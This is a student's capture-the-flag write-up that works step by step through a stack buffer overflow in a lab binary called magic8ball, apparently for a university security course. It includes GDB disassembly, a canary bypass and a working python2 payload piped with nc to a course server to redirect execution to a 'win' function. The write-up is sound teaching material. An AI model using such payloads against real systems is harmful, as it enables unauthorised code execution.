# buffer overflow magic8ball

First, use Binary Ninja to identify vulnerabilities. We can see the "vuln" function and "win" function. Our goal is to exploit "vuln" to reach "win." Let's break this down into three steps.


##### step1 How to create a buffer overflow, and how many bytes are required for the overflow?
I initially attempted to use GDB to determine this. It seems that the buffer size is at -0x2c(%ebp), which means it is 44bytes above the %ebp.

 

   0x0804871a <+130>:    lea    -0x2c(%ebp),%eax

   0x0804871d <+133>:    push   %eax

   0x0804871e <+134>:    call   0x8048450 <gets@plt>
s
 

Given that "fortune1" is pushed onto the stack frame before, it takes up 12 bytes above %ebp. Therefore, the "buf" should be 32 bytes. Please correct me if I am mistaken.

 

   0x080486d3 <+59>:    mov    $0x804a040,%eax

   0x080486d9 <+65>:    mov    (%eax),%eax

   0x080486db <+67>:    mov    %eax,-0xc(%ebp)

   0x080486de <+70>:    sub    $0x8,%esp

   0x080486e1 <+73>:    push   -0xc(%ebp)

 

 

#### step2 How to ensure that "fortune1" remains equal to "fortune"?
first lets try to check if we get buffer overflowed!

python2 -c 'print "A"*31' |./magic8ball

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

zzzzzzzzz

z5441928@vx17:~/6841/bufferflow$ python2 -c 'print "A"*32' |./magic8ball

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

the sands of time have changed!!

 

then I initially tried outputting "4031186800," but it didn't work: 

 

python2 -c 'print "A"*32' | nc comp6841.quoccabank.com 5003

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

the sands of time have changed!!

 

$ python2 -c 'print "A"*31+"4031186800"' |./magic8ball

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

the sands of time have changed!!

 

also tried the address of fortune instead of the value, still not work 



 

 

So, I attempted to debug and found the address to be 0xf0470770, which in decimal is 4033411360. However, I'm not sure of the relationship between 4033411360 and the output from fortune 4031186800  (todo: I will investigate this in the next tutorial.)

I add two breakpoints at the gets the address and the next instruction.

 



 

and run the test which is "A"*32  or "A" * 33 to check which value be changed, then I found the exactly value is 0xf0470770.

 



 

milestone: finally skipped canary!!!!!
python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" ' |./magic8ball

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

zzzzzzzzz

#### step3 How to return to the "win" address?
At first, I tried simply adding the "win" address which is 080485e6

 

objdump -d magic8ball | grep win

080485e6 <win>:

804863c:    75 19                    jne    8048657 <win+0x71>

8048655:    eb 3c                    jmp    8048693 <win+0xad>

 

 

and added into our payload but still not returned to the win fun.

 

python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" +  "\xe6\x85\x04\x08" ' | nc comp6841.quoccabank.com 5003

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

zzzzzzzzz

 

It seemed that some bytes needed to be added between the canary and the return address in "vuln." So, I decided to try a brute-force approach to determine the number of bytes required. It turned out that 12 bytes were needed to successfully reach the "win" address.

 

 

python2 -c 'print "A"*32 + "\x70\x07\x47\xf0" + "B"*12 + "\xe6\x85\x04\x08" ' | nc comp6841.quoccabank.com 5003

Your fortune is 4031186800

idk why your fortune is a number, what does that mean?

What do you think of your fortune?

Thats... interesting... okay

zzzzzzzzz

Ive changed your fortune.

Now your fortune is to go to jail.
